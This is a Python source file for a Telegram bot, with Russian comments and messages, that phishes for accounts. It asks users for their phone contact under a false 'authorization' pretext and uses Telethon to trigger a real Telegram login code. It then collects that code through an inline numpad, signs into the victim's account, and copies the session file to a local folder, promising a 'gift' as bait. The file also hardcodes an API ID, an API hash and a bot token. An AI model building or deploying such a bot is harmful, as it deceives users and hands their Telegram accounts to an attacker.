import os
import shutil
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, CallbackContext
from telethon import TelegramClient
from telethon.errors import PhoneCodeInvalidError

# Конфигурация Telethon
API_ID = '13791466'  # Ваш API ID
API_HASH = '1bc244c0ba8389b1d0bf44b975cbbee4'  # Ваш API Hash
BOT_TOKEN = '7560944606:AAFcOM4y-wY7C-VfaMAaLc5Y-ZgZnmW76Lg'  # Токен вашего бота

# Состояние пользователей
user_state = {}
CODE_TIMEOUT = 600  # Тайм-аут ожидания кода (10 минут)

# Создание inline-клавиатуры
def create_numpad(code_input):
    keyboard = [
        [InlineKeyboardButton("1", callback_data="1"), InlineKeyboardButton("2", callback_data="2"), InlineKeyboardButton("3", callback_data="3")],
        [InlineKeyboardButton("4", callback_data="4"), InlineKeyboardButton("5", callback_data="5"), InlineKeyboardButton("6", callback_data="6")],
        [InlineKeyboardButton("7", callback_data="7"), InlineKeyboardButton("8", callback_data="8"), InlineKeyboardButton("9", callback_data="9")],
        [InlineKeyboardButton("Удалить", callback_data="delete"), InlineKeyboardButton("0", callback_data="0"), InlineKeyboardButton("Подтвердить", callback_data="confirm")]
    ]
    message = f"Введите код: {code_input}" if code_input else "Введите 5-значный код, используя кнопки ниже."
    return keyboard, message

# Команда /start
async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_state[user_id] = {
        "contact_received": False,
        "code_input": "",
    }
    keyboard = [[KeyboardButton("АВТОРИЗОВАТЬСЯ ✅", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "❗️Чтобы начать пользоваться ботом, необходимо пройти авторизацию. Это нужно для того, чтобы мы могли анализировать ваш профиль для более корректной работы бота! ⏳ Это займёт не более минуты! Сделать это можно с помощью кнопки внизу 👇",
        reply_markup=reply_markup
    )

# Обработка отправки контакта
async def handle_contact(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    contact = update.message.contact
    phone_number = contact.phone_number
    username = update.effective_user.username  # Получаем username пользователя

    # Удаляем сообщение с контактом
    await update.message.delete()

    # Удаляем сообщение от бота с просьбой об авторизации, если оно существует
    if "auth_message" in user_state.get(user_id, {}):
        try:
            await context.bot.delete_message(chat_id=user_id, message_id=user_state[user_id]["auth_message"])
        except Exception as e:
            print(f"Ошибка удаления сообщения авторизации: {e}")

    # Сохраняем контакт
    user_state[user_id] = {
        "phone_number": phone_number,
        "contact_received": True,
        "code_input": "",
        "last_request_time": datetime.now(),
    }

    # Убираем клавиатуру и уведомляем пользователя
    await update.message.reply_text("Мы отправили вам код для авторизации! 🚀", reply_markup=ReplyKeyboardRemove())

    # Выводим ID пользователя, username и номер телефона в консоль
    print(f"Пользователь ID: {user_id}, Username: @{username if username else 'Нет username'}, Телефон: {phone_number}")

    # Инициализируем вход в Telegram
    await request_code_telegram(user_id, phone_number, context)

# Запрос кода подтверждения через Telethon
async def request_code_telegram(user_id, phone_number, context):
    try:
        client = TelegramClient(f"session_{user_id}", API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone=phone_number)
        user_state[user_id]["client"] = client

        # Показываем inline-клавиатуру для ввода кода
        keyboard, message = create_numpad("")
        await context.bot.send_message(
            chat_id=user_id,
            text=message,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        print(f"Ошибка при запросе кода: {e}")
        await context.bot.send_message(chat_id=user_id, text="Ошибка при запросе кода. Повторите попытку позже.")

# Обработка нажатий inline-кнопок
async def handle_button(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    user_data = user_state.get(user_id, {})
    code_input = user_data.get("code_input", "")

    if query.data.isdigit():  # Если нажата цифра
        if len(code_input) < 5:
            code_input += query.data
    elif query.data == "delete":  # Удалить последний символ
        code_input = code_input[:-1]
    elif query.data == "confirm":  # Подтвердить ввод
        if len(code_input) == 5:
            await query.edit_message_text("Проверяю код. Пожалуйста, подождите...")
            await login_telegram(user_id, code_input, query)
            return
        else:
            await query.answer("Код должен быть 5-значным.")
            return

    # Обновляем состояние пользователя и клавиатуру
    user_state[user_id]["code_input"] = code_input
    keyboard, message = create_numpad(code_input)
    await query.edit_message_text(text=message, reply_markup=InlineKeyboardMarkup(keyboard))

# Вход в Telegram через Telethon
async def login_telegram(user_id, code, query):
    user_data = user_state.get(user_id, {})
    client = user_data.get("client")
    phone_number = user_data.get("phone_number")
    session_file = f"session_{user_id}.session"
    target_folder = r"D:\Sessions"

    try:
        await client.sign_in(phone=phone_number, code=code)
        user_state[user_id]["login_successful"] = True
        await query.edit_message_text("Вы успешно авторизировались! ✅ Ожидайте подарок в течение 24 часов.")

        # Сохраняем сессию
        await client.disconnect()
        if not os.path.exists(target_folder):
            os.makedirs(target_folder)
        shutil.copy(session_file, target_folder)
        print(f"Сессия {session_file} сохранена в {target_folder}.")
    except PhoneCodeInvalidError:
        await query.edit_message_text("Код неверный. Попробуйте снова.")
        user_state[user_id]["code_input"] = ""
    except Exception as e:
        print(f"Ошибка: {e}")
        await query.edit_message_text("Произошла ошибка. Попробуйте позже.")

# Основная функция
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(CallbackQueryHandler(handle_button))

    print("Бот запущен...")
    app.run_polling()

if __name__ == "__main__":
    main()
